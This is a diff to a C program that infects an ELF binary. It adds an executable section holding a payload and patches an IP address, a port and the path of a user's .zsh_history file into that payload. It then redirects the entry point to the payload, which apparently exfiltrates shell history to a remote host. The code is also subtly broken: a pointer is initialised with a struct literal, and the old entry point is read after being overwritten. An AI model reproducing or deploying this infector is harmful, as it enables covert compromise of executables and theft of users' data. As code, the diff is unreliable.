@@ -31,7 +31,6 @@ int main(int argc, char *argv[], char *envp[]) {
     addr_ip = htonl(INADDR_ANY);
     printf("port: %#x %#x\n", port, addr_ip);
 
-
 	int fd = open("testprog", O_RDWR);
 	if (fd == -1) {
 		perror("open");
@@ -85,6 +84,78 @@ int main(int argc, char *argv[], char *envp[]) {
 
 	printf("last_phdr: %d\n", last_phdr);
 	printf("last_section: %d\n", last_section);
+
+	// create new section
+
+	Elf64_Shdr *new_shdr = {
+		.sh_name = 0,
+		.sh_type = SHT_PROGBITS,
+		.sh_flags = SHF_ALLOC | SHF_EXECINSTR,
+		.sh_addr = last_phdr_p->p_vaddr + last_phdr_p->p_memsz,
+		.sh_offset = last_phdr_p->p_offset + last_phdr_p->p_filesz,
+		.sh_size = payload_size_p,
+		.sh_link = 0,
+	};
+
+	// update program header
+	last_phdr_p->p_filesz += payload_size_p;
+	last_phdr_p->p_memsz += payload_size_p;
+
+	// update section headers after the new one
+	// the section after `last_section` must be moved to leave space for the new section
+
+	// since whe are adding a new section, the file size must be increased and the file must be mapped again adding the section size + the payload size
+	ftruncate(fd, st.st_size + sizeof(Elf64_Shdr) + payload_size_p);
+	map = mremap(map, st.st_size, st.st_size + sizeof(Elf64_Shdr) + payload_size_p, MREMAP_MAYMOVE);
+
+	if (map == MAP_FAILED) {
+		perror("mremap");
+		return 1;
+	}
+
+	for (int j = ehdr->e_shnum - 1; j > last_section; j--)
+	{
+		shdr[j + 1] = shdr[j];
+	}
+
+	// insert the new section
+	shdr[last_section + 1] = new_shdr;
+
+	// the number of section headers has increased
+	ehdr->e_shnum++;
+
+
+	// move all the content at  map + new_shdr->sh_offset to leave space the payload data
+
+	memmove(map + new_shdr->sh_offset + payload_size_p, map + new_shdr->sh_offset, st.st_size - new_shdr->sh_offset);
+
+	// copy the payload data to the new section
+
+	memcpy(map + new_shdr->sh_offset, payload_p, payload_size_p);
+
+	// update the payload patching the data
+
+	// update the addr_ip
+	memcpy(map + new_shdr->sh_offset + payload_size_p - 4, &addr_ip, sizeof(addr_ip));
+	// update the port
+	memcpy(map + new_shdr->sh_offset + payload_size_p - 4 - 2, &port, sizeof(port));
+	// copyt the file path
+	memcpy(map + new_shdr->sh_offset + payload_size_p - 1024 - 6, "/home/maxence/.zsh_history", 27);
+
+	// update the entry point
+
+	ehdr->e_entry = new_shdr->sh_addr;
+
+	// add the old entry point to the payload
+
+	// get the old entry point
+	uint64_t old_entry = ehdr->e_entry;
+	//calculate the offset from the new entry point
+	int32_t offset = old_entry - new_shdr->sh_addr;
+	// update the payload with the offset
+	memcpy(map + new_shdr->sh_offset + payload_size_p - 1186 - 6 - 4, &offset, sizeof(offset));
+
+	// cleanup
 
 	munmap(map, st.st_size);
 	close(fd);
